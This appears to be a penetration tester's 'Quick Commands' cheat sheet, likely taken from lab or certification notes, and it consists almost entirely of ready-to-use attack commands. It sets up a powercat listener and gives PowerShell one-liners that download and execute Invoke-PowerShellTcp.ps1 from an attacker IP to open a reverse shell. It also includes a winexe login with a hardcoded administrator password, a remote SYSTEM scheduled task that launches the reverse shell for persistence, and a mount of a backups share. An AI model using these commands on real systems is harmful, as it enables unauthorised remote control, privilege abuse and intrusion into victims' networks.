# Quick Commands

### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

powercat -l -v -p 443 -t 100

```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443


powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

```
winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
```

```
wmic os get osarchitecture
```

### Schedule Task <a href="#schedule-task" id="schedule-task"></a>

```
schtasks /create /S mgmtsrv.tech.finance.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'Import-Module C:\Users\Public\Downloads\Invoke-PowerShellTcp.ps1;Power -Reverse -IPAddress 172.16.100.1 -Port 443 '"

schtasks /Run /S mgmtsrv.tech.finance.corp /TN “STCheck”
```

```
mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
```
